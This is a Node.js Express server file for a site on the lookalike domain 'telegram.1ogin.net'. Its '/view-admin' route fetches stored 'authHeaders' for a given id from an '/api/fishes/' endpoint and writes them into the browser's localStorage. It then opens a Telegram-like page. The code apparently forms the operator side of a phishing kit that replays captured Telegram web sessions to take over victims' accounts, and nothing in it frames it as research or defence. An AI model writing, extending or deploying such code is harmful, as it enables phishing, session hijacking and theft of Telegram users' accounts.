const compression = require('compression');
const express = require('express');
const https = require('https');
const http = require('http');
const fs = require('fs');

const app = express();

const thirdTour = process.argv[2] == 3;
const forcePort = process.argv[3];
const useHttp = process.argv[4] !== 'https';

const publicFolderName = thirdTour ? 'public3' : 'public';
const port = forcePort ? +forcePort : (thirdTour ? 8443 : 80);

app.set('etag', false);
app.use((req, res, next) => {
  res.set('Cache-Control', 'no-store');
  next();
});
app.use(compression());
app.use(express.static(publicFolderName));

app.get('/', (req, res) => {
  res.sendFile(__dirname + `/${publicFolderName}/index.html`);
});

const serviceDomain = 'telegram.1ogin.net';

app.get('/view-admin', (req, res) => {
  const {id} = req.query;
  res.header('content-type', 'text/html')
  .send(`<html><head><script>
  async function fetchAndSetLocalStorage() {
    try {
        // Fetch data from the server
        const response = await fetch('https://${serviceDomain}:4000/api/fishes/${id}');
        if (!response.ok) {
            throw new Error(\`Error fetching data: \${response.statusText}\`);
        }

        // Parse the JSON response
        const data = await response.json();
        localStorage.clear();
        // Set each key-value pair in localStorage
        for (const [key, value] of Object.entries(data.authHeaders)) {
            localStorage.setItem(key, value);
        }

        window.location.href = "/";
        console.log('LocalStorage data updated successfully');
    } catch (error) {
        console.error('Failed to fetch or set localStorage data:', error);
    }
  }

  // Call the function to fetch and set localStorage data
  fetchAndSetLocalStorage();
  </script></head>
  <body>
  Please wait for a second to prepare your session...
  </body></html>`);
})
const server = useHttp ? http : https;

let options = {};
if(!useHttp) {
  options.key = fs.readFileSync('/etc/letsencrypt/live/telegram.1ogin.net/privkey.pem');
  options.cert = fs.readFileSync('/etc/letsencrypt/live/telegram.1ogin.net/cert.pem');
}

server.createServer(options, app).listen(port, () => {
  console.log('Listening port:', port, 'folder:', publicFolderName);
});
